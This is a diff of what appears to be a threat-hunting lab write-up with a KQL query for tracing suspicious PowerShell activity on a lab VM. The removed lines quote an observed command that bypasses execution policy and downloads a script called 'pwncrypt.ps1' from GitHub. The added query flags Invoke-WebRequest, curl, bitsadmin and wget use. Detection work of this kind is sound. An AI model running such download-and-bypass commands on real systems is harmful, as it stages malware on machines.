@@ -79,18 +79,22 @@ hits
 - **Host:** gab-intrn-vm  
 - **Timestamp:** 10/6/2025, 12:13:22.448 PM (console), earliest creation at **2025-10-06T12:13:22.4483418Z**  
 - **Process:** powershell.exe  
-- **CommandLine:** `
-"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`  
-- **SHA256:** `9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3`  
-💡 **Why it matters:** Establishes the first malicious PowerShell usage to enumerate identity/privileges, anchoring the intrusion timeline.
+- **CommandLine:** `powershell -ExecutionPolicy Unrestricted -File script0.ps1`  
+- **SHA256:** `badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0`  
+💡 **Why it matters:** Pinpointing the first unusual execution helps you anchor the timeline and follow the actor’s parent/child process chain.
 **KQL Query Used:**
 ```
 DeviceProcessEvents
-| where DeviceName contains "nathan-iel-vm"
-| where ProcessCommandLine contains "who"
-| project Timestamp, DeviceName, FileName, ProcessCommandLine, ProcessCreationTime,InitiatingProcessCommandLine , InitiatingProcessCreationTime, SHA256
+| where DeviceName == "gab-intern-vm"
+| where TimeGenerated  between(datetime(2025-10-01) .. datetime(2025-10-15))
+| where ProcessCommandLine contains "Invoke-WebRequest"
+    or ProcessCommandLine contains "curl"
+    or ProcessCommandLine contains "bitsadmin"
+    or ProcessCommandLine contains "wget"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine,SHA256
+| order by TimeGenerated asc
 ```
-<img width="528" height="313" alt="Screenshot 2025-08-17 213848" src="https://github.com/user-attachments/assets/529a90cb-083e-43b8-a0ad-85aa9ed5a3b2" />
+<img width="528" height="313" alt="Screenshot 2025-08-17 213848" src="https://github.com/davidbrown-sec/Threat-Hunting/blob/a3d9648024f39de2b6b0294cdc9ed3fc68ab2c79/screen%20captures/Assistance-F1.png"/>
 
 
 ---
